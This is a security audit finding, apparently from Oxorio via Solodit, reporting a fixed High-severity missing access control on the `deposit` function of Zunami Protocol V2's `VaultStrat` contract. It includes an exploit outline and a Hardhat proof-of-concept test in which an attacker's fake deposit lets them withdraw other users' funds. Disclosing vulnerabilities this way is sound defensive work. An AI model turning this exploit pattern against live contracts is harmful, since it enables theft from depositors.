---
affected_contracts: []
derives_from: []
id: solodit-oxorio-2024-02-06-zunami-protocolv2-0-0
ingested_at: '2026-08-16T05:02:10Z'
protocol_category: []
published_at: '2024-02-06T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Oxorio/2024-02-06-Zunami%20ProtocolV2.md
tags:
- firm:oxorio
- report:2024-02-06-zunami-protocolv2
title: '[FIXED] No access control for `deposit` function call in `VaultStrat`'
vuln_class: []
---

# [FIXED] No access control for `deposit` function call in `VaultStrat`

_Section severity (from Solodit section header): High_  
_Audit firm: Oxorio_  
_Source report: [2024-02-06-Zunami ProtocolV2.md](https://github.com/solodit/solodit_content/blob/main/reports/Oxorio/2024-02-06-Zunami%20ProtocolV2.md)_

---

##### Location
File | Location | Line
--- | --- | ---
[VaultStrat.sol](https://github.com/ZunamiProtocol/ZunamiProtocolV2/tree/8bc108201bef8c4d341ecd3a29a3b1d975019cec/contracts/strategies/VaultStrat.sol#L30 "/contracts/strategies/VaultStrat.sol") | contract `VaultStrat` > function `deposit` | 30

##### Description
The `deposit` function of the `VaultStrat` contract has an `external` visibility modifier and can be called by any address without permissions. An attacker can make a fake deposit to the `VaultStrat` contract by directly calling the `deposit` function without any token value. This leads to incorrect computation of the withdrawal value during withdrawal from the strategy. The process can be exploited as follows:
- Honest users deposit to `VaultStrat` through the controller.
- The attacker makes a low deposit to `VaultStrat` through the controller.
- The attacker makes a fake deposit to `VaultStrat` directly.
- The attacker withdraws all funds from `VaultStrat` through the controller.

```ts
  it('open deposit method in VaultStrat', async () => {
    const {
        alice,
        bob,
        zunamiPool,
        zunamiPoolController,
        strategies,
        usdt,
    } = await loadFixture(deployFixture);

    // add VaultStrat to zunamiPoolController
    const strategy = strategies[0];
    await zunamiPool.addStrategy(strategy.address);

    await zunamiPoolController.setDefaultDepositSid(0);
    await zunamiPoolController.setDefaultWithdrawSid(0);

    // Alice deposits 100 to VaultStrat
    await expect(
        zunamiPoolController
            .connect(alice)
            .deposit(getMinAmountZunUSD('100'), alice.getAddress())
    ).to.emit(zunamiPool, 'Deposited');

    // Bob deposits 100 to VaultStrat
    await expect(
        zunamiPoolController
            .connect(bob)
            .deposit(getMinAmountZunUSD('100'), bob.getAddress())
    ).to.emit(zunamiPool, 'Deposited');

    // Bob makes fake deposit to VaultStrat
    await strategy.connect(bob).deposit(getMinAmountZunUSD('200'))

    // Bob withdraws 200 from VaultStrat
    let balanceBefore = BigNumber.from(await usdt.balanceOf(bob.getAddress()));
    let sharesAmount = BigNumber.from(
        await zunamiPool.balanceOf(bob.getAddress())
    );
    await zunamiPool.connect(bob).approve(zunamiPoolController.address, sharesAmount);

    await expect(
        zunamiPoolController.connect(bob).withdraw(sharesAmount, [0, 0, 0, 0, 0], bob.getAddress())
    ).to.emit(zunamiPool, 'Withdrawn');

    expect(
        BigNumber.from(await usdt.balanceOf(bob.getAddress())).sub(balanceBefore)
    ).to.eq(ethers.utils.parseUnits('200', 'mwei'));
  });
```
##### Recommendation
We recommend adding access control for the `deposit` function.

##### Update
Fixed in commit [`9ffa8e1b6128d1ade8459a4e492cee669ed241a1`](https://github.com/ZunamiProtocol/ZunamiProtocolV2/tree/9ffa8e1b6128d1ade8459a4e492cee669ed241a1/).
